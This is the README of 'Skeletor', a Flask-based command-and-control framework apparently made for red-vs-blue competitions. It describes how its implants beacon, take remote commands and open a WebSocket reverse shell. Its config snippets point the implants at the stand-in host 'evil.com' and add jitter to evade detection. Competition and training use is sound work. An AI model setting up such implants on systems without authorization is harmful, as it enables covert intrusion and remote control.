# Skeletor

Skeletor is a HTTP C2 built upon the Flask framework designed for red vs. blue cybersecurity competitions. Use only on systems which you own or are authorized to deploy on.
Skeletor clients communicate on a beaconing system, sending outbound POST requests to the Skeletor server's **/tasks** route at specified intervals containing JSON data in the format:
```json
{
  "agent_id": "192.168.1.9"
}
```  
where agent_id is typically the local ip address of the agent, which is important for allowing us to see the local ip for identifying boxes in many red vs blue competitions. Optionally, agent_id could have 
a different identifier, depending on how you wish to identify different agents. If there are one or more tasks assigned to them, this will retrieve the first task, which they will then handle and return the result back to the server.

# Tasks
Tasks are Skeletor's way of assigning work to clients. When a client send a POST request to the server's **/tasks** route containing their agent_id, if a task exists with a matching agent_id and a completed field with a value of False, 
the client receives a JSON object in the form:
```json
{
  "action": "command||shell",
  "input": "command or other input",
  "input2": "secondary input to action if required",
  "task_id": 99
}
```
The most commonly used action for Skeletor clients is **command**, where the agents will execute the command via bash for Linux systems and Powershell for Windows systems, then return a JSON object in the
form of 
```json
{
  "agent_id": "10.1.1.9"
  "task_id": 79
  "result": "root"
  "returncode": 0
}
```
where task_id is assigned by the server to the task when it is created to keep track of different tasks.  

## Reverse Shell
Skeletor's **Go Implant** also has a **shell** action, which is 
used to create a reverse shell over a WebSocket. To do so, 
run the shell_handler.go program, either by compiling it or with
the command *go run shell_handler.go*, which will listen for 
incoming connections, by default on port 9000 and give you an
interactive reverse shell to execute commands in real-time.

> The shell handler is only designed to handle one connection at
a time. Make sure you end the previous connection before 
starting a new interactive shell. 

# Usage
## Server
The Skeletor Console is the primary way of interacting with the Skeletor server. 

Previously, the manager.py TUI and skelctl CLI could be used to manage Skeletor. However, these are now considered **legacy** and will not be updated. Additionally, skelctl will not work with the current version of Skeletor, as targeting logic has been moved from server side to client side. However, the legacy version of Skeletor can still be accessed in the **legacy** branch and will remain compatible with these management interfaces but will not receive any additional updates.

### Skeletor Console
To interact with the Skeletor server and issue commands to agents, use the Skeletor Console (*console.py*). Skeletor Console provides an interactive interface which allows you to issue commands and control Skeletor agents.
## Implants
To set up the implants, make any configuration changes needed in the main function of the implant program. Then, when run it will begin beaconing out to retrieve commands from the configured server. There are currently implants written in two different languages: Python and Go.

### Python Implant

 The Python implant has three configurable arguments when creating an instance of the Beacon class: server_ip (mandatory, the IP or FQDN of the host the server is running on), port (port the server is listening on, defaults to 80), and callback_interval (the interval, in seconds, of how often the implant should beacon out. Default is 120). Additional arguments which can be defined are the jitter (defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect) and the debug and https booleans (both default to False, if https is True then https protocol will be used instead of http, and if debug is True then debugging + error messages will be printed to stdout). The following codeblock illustrates what the main function of beacon.py looks like when specifying all arguments to the implant.
```python
def main():
    beacon = Beacon(server_ip="evil.com", port=80,callback_interval=120,jitter=5,debug=False,https=False)
    beacon.run()
```

### Go Implant

 The Go implant's configurable arguments must be changed in the agent variable definition at the beginning of the main function. ServerIP, ServerPort, CallbackInterval, Jitter and Debug can all be changed depending on your desired configuration, while the LocalIP and Client fields of the agent struct SHOULD NOT be modified. ServerIP and ServerPort define the IP/FQDN and port the Skeletor server is listening for incoming connections on, while the CallbackInterval defines how often the implant should beacon out, while Jitter defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect. Debug is a boolean value which, when set to true, will print out debugging and error messages to stdout.

```go
agent := Agent{
        LocalIP:  getLocalIP(),
        ServerIP: "evil.com",
        ServerPort: 80,
		CallbackInterval: 15,
		Jitter: 5,
		Debug: true,
		Client: &http.Client{
            Timeout: 10 * time.Second,
        },
    }
```

### Implant Feature Comparison

| Feature | Go Implant | Python Implant|
| :--- | :---: | :---: |
| **Command Execution** | &check; | &check; |
| **HTTPS Support** | &cross;| &check; |
|**Websocket-based Reverse Shell**|&check;|&cross;|
